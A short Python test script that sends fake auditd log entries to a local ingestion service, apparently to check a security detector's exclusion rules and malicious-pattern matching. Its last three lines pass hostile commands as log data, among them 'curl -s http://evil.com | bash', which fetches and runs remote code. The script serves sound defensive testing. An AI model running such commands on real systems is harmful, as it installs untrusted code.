import requests

def send_log(msg):
    log = {
        "log_type": "auditd",
        "message": msg,
        "host": "test-host",
        "command_line": msg
    }
    r = requests.post("http://localhost:8000/ingest/log", json=log)
    print(f"Sent: {msg} -> Status: {r.status_code}")

print("--- Testing exclusions ---")
send_log("curl http://localhost:8000/api/agent/rules")
send_log("healthcheck running")
send_log("pg_isready -U postgres")

print("--- Testing malicious patterns ---")
send_log("curl http://evil.com -o malware.sh")
send_log("wget http://evil.com/shell.sh")
send_log("curl -s http://evil.com | bash")

